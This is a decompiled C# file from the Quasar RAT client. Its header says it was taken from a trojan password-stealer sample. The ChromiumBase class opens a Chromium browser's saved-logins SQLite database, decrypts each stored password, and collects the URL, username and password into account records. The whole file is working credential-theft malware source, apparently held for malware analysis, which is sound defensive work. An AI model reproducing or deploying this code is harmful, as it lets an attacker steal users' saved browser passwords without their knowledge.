// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Recovery.Browsers.ChromiumBase
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Recovery.Utilities;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
  public abstract class ChromiumBase : IAccountReader
  {
    public abstract string ApplicationName { get; }

    public abstract IEnumerable<RecoveredAccount> ReadAccounts();

    protected List<RecoveredAccount> ReadAccounts(
      string filePath,
      string localStatePath)
    {
      List<RecoveredAccount> recoveredAccountList = new List<RecoveredAccount>();
      if (!File.Exists(filePath))
        throw new FileNotFoundException("Can not find chromium logins file");
      if (!File.Exists(filePath))
        return recoveredAccountList;
      ChromiumDecryptor chromiumDecryptor = new ChromiumDecryptor(localStatePath);
      SQLiteHandler sqLiteHandler;
      try
      {
        sqLiteHandler = new SQLiteHandler(filePath);
      }
      catch (Exception ex)
      {
        return recoveredAccountList;
      }
      if (!sqLiteHandler.ReadTable("logins"))
        return recoveredAccountList;
      for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
      {
        try
        {
          string str1 = sqLiteHandler.GetValue(row_num, "origin_url");
          string str2 = sqLiteHandler.GetValue(row_num, "username_value");
          string str3 = chromiumDecryptor.Decrypt(sqLiteHandler.GetValue(row_num, "password_value"));
          if (!string.IsNullOrEmpty(str1))
          {
            if (!string.IsNullOrEmpty(str2))
              recoveredAccountList.Add(new RecoveredAccount()
              {
                Url = str1,
                Username = str2,
                Password = str3,
                Application = this.ApplicationName
              });
          }
        }
        catch (Exception ex)
        {
        }
      }
      return recoveredAccountList;
    }
  }
}
